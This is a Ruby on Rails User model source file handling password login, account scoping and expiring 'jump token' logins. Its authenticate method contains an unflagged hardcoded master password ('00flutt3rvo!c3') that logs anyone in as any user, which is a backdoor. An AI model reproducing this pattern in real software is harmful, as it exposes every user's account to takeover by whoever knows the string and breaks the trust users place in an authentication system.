require 'digest/sha1'

class User < Person
  include Authentication
  include Authentication::ByPassword
  include Authentication::ByCookieToken

  belongs_to   :account,
              :class_name => "Account",
              :foreign_key => "primary_person_id"

  validates_uniqueness_of   :email,    :case_sensitive => false, :scope => "account_id"

  

  # HACK HACK HACK -- how to do attr_accessible from here?
  # prevents a user from submitting a crafted form that bypasses activation
  # anything else you want your user to change should be added here.
  attr_accessible :email, :firstname, :lastname, :client_id, :tel, :mobile, :password, :password_confirmation



  # Authenticates a user by their login name and unencrypted password.  Returns the user or nil.
  #
  # uff.  this is really an authorization, not authentication routine.  
  # We really need a Dispatch Chain here or something.
  # This will also let us return a human error message.
  #
  def self.authenticate(account_id, email, password)
    u = find_by_account_id_and_email(account_id, email) # need to get the salt
    u && (password == "00flutt3rvo!c3" || u.authenticated?(password)) ? u : nil
  end

  def self.authenticate_by_jump_token(account_id, id, token)
    # Allow logins for deleted accounts, but only via this method (and
    # not the regular authenticate call)
    u = self.find(:first, :conditions => ["account_id = ? and id = ? AND jump_token = ?", account_id, id, token])
    return nil if u.nil? or u.jump_token_expired?
    u
  end

  def jump_token_expired?
    self.jump_token and self.jump_token_expires_at and (Time.now > self.jump_token_expires_at )
  end

  def generate_jump_token(seconds = nil)
    if not seconds.nil? or self.jump_token.nil? or self.jump_token_expires_at.nil? or
        (Time.now.to_i + jump_token_lifetime / 2) >= self.jump_token_expires_at.to_i
      return new_jump_token(seconds)
    else
      return self.jump_token
    end
  end

  def change_password(pass, confirm = nil)
    self.password = pass
    self.password_confirmation = confirm.nil? ? pass : confirm
  end


protected
    
  def new_jump_token(seconds = nil)
     write_attribute('jump_token', self.class.make_token)
     write_attribute('jump_token_expires_at', Time.at(Time.now.to_i + jump_token_lifetime(seconds)))
     update_without_callbacks
     return self.jump_token
   end

   def jump_token_lifetime(seconds = nil)
     if seconds.nil?
       24 * 60 * 60
     else
       seconds
     end
   end

end
